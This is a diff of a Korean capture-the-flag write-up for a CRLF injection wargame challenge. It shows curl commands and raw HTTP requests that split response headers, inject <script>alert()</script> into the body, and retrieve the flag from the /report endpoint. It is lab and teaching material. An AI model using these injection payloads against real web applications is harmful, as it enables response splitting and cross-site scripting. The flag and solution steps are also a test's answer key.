@@ -341,12 +341,12 @@ I't is very good day to walk out. Power thourgh!!!!
 
 |
 
-### 1-2. 헤더 두 개 설정
+### 1-3. 헤더를 본문으로 인식
 
 ---
 
 ```bash
-curl -v http://war.knock-on.org:10013/ -d "header=header1: value1%0D%0Aheader2&value=value2"
+curl -v http://war.knock-on.org:10013/ -d "header=header1:value1%0D%0A%0D%0Aheader2&value=value2"
 ```
 
 ```bash
@@ -359,75 +359,34 @@ curl -v http://war.knock-on.org:10013/ -d "header=header1: value1%0D%0Aheader2&v
 > Host: war.knock-on.org:10013
 > User-Agent: curl/8.5.0
 > Accept: */*
-> Content-Length: 48
+> Content-Length: 53
 > Content-Type: application/x-www-form-urlencoded
 >
 < HTTP/1.1 200 OK
 < Server: Werkzeug/3.0.3 Python/3.10.12
-< Date: Sat, 14 Sep 2024 12:51:45 GMT
+< Date: Mon, 16 Sep 2024 13:39:50 GMT
 < Content-Type: text/html; charset=utf-8
 < Content-Length: 51
-< header1: value1
-< header2: value2
-< Connection: close
+< header1:value1
 <
-* Closing connection
-I't is very good day to walk out. Power thourgh!!!!
-```
+header2: value2
+Connection: close
 
-```bash
-"header=header1: value1%0D%0Aheader2&value=value2"
+* Connection #0 to host war.knock-on.org left intact
+I't is very g
 ```
 
 `\r = %0D`: Carrage Return
 
 `\n = %0A`: Line Feed
 
-`CRLF Injection`으로 헤더를 두 개 설정
+1. `CRLF Injection`으로 헤더를 두 개 설정
 
-|
+    첫 번째 헤더의 `value` 뒷부분에 `:`을 사용하면 헤더가 두 개로 분리됨
 
-### 1-3. 헤더를 본문으로 인식
+2. `CRLF`를 두 개 추가하면 두 번째 헤더를 본문으로 인식시킬 수 있음
 
----
-
-```bash
-curl -v http://war.knock-on.org:10013/ -d "header=header1: value1%0D%0A%0D%0Aheader2&value=value2"
-```
-
-```bash
-* Host war.knock-on.org:10013 was resolved.
-* IPv6: 64:ff9b::3b12:d88d
-* IPv4: 59.18.216.141
-*   Trying [64:ff9b::3b12:d88d]:10013...
-* Connected to war.knock-on.org (64:ff9b::3b12:d88d) port 10013
-> POST / HTTP/1.1
-> Host: war.knock-on.org:10013
-> User-Agent: curl/8.5.0
-> Accept: */*
-> Content-Length: 54
-> Content-Type: application/x-www-form-urlencoded
->
-< HTTP/1.1 200 OK
-< Server: Werkzeug/3.0.3 Python/3.10.12
-< Date: Sat, 14 Sep 2024 12:50:00 GMT
-< Content-Type: text/html; charset=utf-8
-< Content-Length: 51
-< header1: value1
-<
-header2: value2
-Connection: close
-
-* Excess found writing body: excess = 38, size = 51, maxdownload = 51, bytecount = 51
-* Closing connection
-I't is very g
-```
-
-```bash
-"header=header1: value1%0D%0A%0D%0Aheader2&value=value2"
-```
-
-첫 번째 헤더의 `value` 뒷부분에 `CRLF`를 두 개 추가하면 두 번째 헤더를 본문으로 인식시킬 수 있음
+`value1`, `header1`, `value2`는 없어도 됨
 
 |
 
@@ -436,8 +395,10 @@ I't is very g
 ---
 
 ```bash
-curl -v http://war.knock-on.org:10013/ -d "header=header1: value1%0D%0A%0D%0A<script>alert(123)</script>header2&value=value2"
+curl -v http://war.knock-on.org:10013/ -d "header=header1:value1%0D%0A%0D%0A<script>alert()</script>header2&value=value2"
+```
 
+```bash
 * Host war.knock-on.org:10013 was resolved.
 * IPv6: 64:ff9b::3b12:d88d
 * IPv4: 59.18.216.141
@@ -447,29 +408,25 @@ curl -v http://war.knock-on.org:10013/ -d "header=header1: value1%0D%0A%0D%0A<sc
 > Host: war.knock-on.org:10013
 > User-Agent: curl/8.5.0
 > Accept: */*
-> Content-Length: 81
+> Content-Length: 77
 > Content-Type: application/x-www-form-urlencoded
 >
 < HTTP/1.1 200 OK
 < Server: Werkzeug/3.0.3 Python/3.10.12
-< Date: Sat, 14 Sep 2024 13:00:42 GMT
+< Date: Mon, 16 Sep 2024 13:43:41 GMT
 < Content-Type: text/html; charset=utf-8
 < Content-Length: 51
-< header1: value1
+< header1:value1
 <
-<script>alert(123)</script>header2: value2
-* Excess found writing body: excess = 65, size = 51, maxdownload = 51, bytecount = 51
+<script>alert()</script>header2: value2
+* Excess found writing body: excess = 11, size = 51, maxdownload = 51, bytecount = 51
 * Closing connection
-Connect
-```
-
-```bash
-"header=header1: value1%0D%0A%0D%0A<script>alert(123)</script>header2&value=value2"
+Connection
 ```
 
 CRLF를 두 번 추가한 부분부터는 본문으로 인식됨
 
-이곳에 `<script>alert()</script>`삽입
+본문에 `<script>alert()</script>`삽입
 
 |
 
@@ -478,8 +435,10 @@ CRLF를 두 번 추가한 부분부터는 본문으로 인식됨
 ---
 
 ```bash
-curl -v http://war.knock-on.org:10013/report -d "header=header1: value1%0D%0A%0D%0A<script>alert()</script>header2&value=value2"
+curl -v http://war.knock-on.org:10013/report -d "header=header1:value1%0D%0A%0D%0A<script>alert()</script>header2&value=value2"
+```
 
+```bash
 * Host war.knock-on.org:10013 was resolved.
 * IPv6: 64:ff9b::3b12:d88d
 * IPv4: 59.18.216.141
@@ -489,12 +448,12 @@ curl -v http://war.knock-on.org:10013/report -d "header=header1: value1%0D%0A%0D
 > Host: war.knock-on.org:10013
 > User-Agent: curl/8.5.0
 > Accept: */*
-> Content-Length: 78
+> Content-Length: 77
 > Content-Type: application/x-www-form-urlencoded
 >
 < HTTP/1.1 200 OK
 < Server: Werkzeug/3.0.3 Python/3.10.12
-< Date: Sat, 14 Sep 2024 12:58:28 GMT
+< Date: Mon, 16 Sep 2024 13:44:34 GMT
 < Content-Type: text/html; charset=utf-8
 < Content-Length: 37
 < Connection: close
@@ -504,6 +463,14 @@ K0{CRLF_is_very_common_vulnerability}
 ```
 
 `/`경로에서 잘 되는 것을 확인했으니 그대로 `/report` 경로로 요청
+
+|
+
+```bash
+curl -v http://war.knock-on.org:10013/report -d "header=%0d%0a%0D%0A<script>alert()</script>&value"
+```
+
+코드 다이어트하면 이렇게 됨
 
 |
 
@@ -541,7 +508,7 @@ I't is very good day to walk out. Power thourgh!!!!
 
 |
 
-### 2-2. 헤더 두 개 설정
+### 2-2. 헤더의 value를 본문으로 인식
 
 ---
 
@@ -550,28 +517,30 @@ POST / HTTP/1.1
 Host: war.knock-on.org:10013
 Content-Type: application/x-www-form-urlencoded
 
-header=header1: value1
-header2&value=value2
+header=header1
+
+&value=value1
 ```
 
 ```sh
 HTTP/1.1 200 OK
 Server: Werkzeug/3.0.3 Python/3.10.12
-Date: Mon, 16 Sep 2024 12:17:25 GMT
+Date: Mon, 16 Sep 2024 13:13:28 GMT
 Content-Type: text/html; charset=utf-8
 Content-Length: 51
-header1: value1
-header2: value2
+header1
+
+: value1
 Connection: close
 
 I't is very good day to walk out. Power thourgh!!!!
 ```
 
-헤더 두 개 설정
+`CRLF`를 추가하여 헤더의 value를 본문으로 인식시킴
 
 |
 
-### 2-3. 헤더를 본문으로 인식
+### 2-3. 본문에 내용 추가
 
 ---
 
@@ -580,54 +549,22 @@ POST / HTTP/1.1
 Host: war.knock-on.org:10013
 Content-Type: application/x-www-form-urlencoded
 
-header=header1: value1
+header=header1
 
-header2&value=value2
+<script>alert()</script>
+&value=value1
 ```
 
 ```sh
 HTTP/1.1 200 OK
 Server: Werkzeug/3.0.3 Python/3.10.12
-Date: Mon, 16 Sep 2024 12:18:48 GMT
+Date: Mon, 16 Sep 2024 13:15:09 GMT
 Content-Type: text/html; charset=utf-8
 Content-Length: 51
-header1: value1
-
-header2: value2
-Connection: close
-
-I't is very good day to walk out. Power thourgh!!!!
-```
-
-`CRLF`를 추가하여 두 번째 헤더를 본문으로 인식시킴
-
-|
-
-### 2-4. 본문에 내용 추가
-
----
-
-```sh
-POST / HTTP/1.1
-Host: war.knock-on.org:10013
-Content-Type: application/x-www-form-urlencoded
-
-header=header1: value1
+header1
 
 <script>alert()</script>
-header2&value=value2
-```
-
-```sh
-HTTP/1.1 200 OK
-Server: Werkzeug/3.0.3 Python/3.10.12
-Date: Mon, 16 Sep 2024 12:20:38 GMT
-Content-Type: text/html; charset=utf-8
-Content-Length: 51
-header1: value1
-
-<script>alert()</script>
-header2: value2
+: value1
 Connection: close
 
 I't is very good day to walk out. Power thourgh!!!!
@@ -637,7 +574,7 @@ I't is very good day to walk out. Power thourgh!!!!
 
 |
 
-### 2-5. /report에 요청
+### 2-4. /report에 요청
 
 ----
 
@@ -646,16 +583,16 @@ POST /report HTTP/1.1
 Host: war.knock-on.org:10013
 Content-Type: application/x-www-form-urlencoded
 
-header=header1: value1
+header=header1
 
 <script>alert()</script>
-header2&value=value2
+&value=value1
 ```
 
 ```sh
 HTTP/1.1 200 OK
 Server: Werkzeug/3.0.3 Python/3.10.12
-Date: Mon, 16 Sep 2024 12:21:02 GMT
+Date: Mon, 16 Sep 2024 13:15:45 GMT
 Content-Type: text/html; charset=utf-8
 Content-Length: 37
 Connection: close
@@ -678,7 +615,7 @@ K0{CRLF_is_very_common_vulnerability}
 ---
 
 ```bash
-curl -v http://war.knock-on.org:10013/report -d "header=header:%0d%0a%0D%0A<script>alert(1)</script>&value"
+curl -v http://war.knock-on.org:10013/report -d "header=%0d%0a%0D%0A<script>alert()</script>&value"
 ```
 
 |
@@ -691,11 +628,12 @@ curl -v http://war.knock-on.org:10013/report -d "header=header:%0d%0a%0D%0A<scri
 POST /report HTTP/1.1
 Host: war.knock-on.org:10013
 Content-Type: application/x-www-form-urlencoded
+Content-Length: 57
 
-header=header1: value1
+header=header1
 
 <script>alert()</script>
-header2&value=value2
+&value=value1
 ```
 
 |
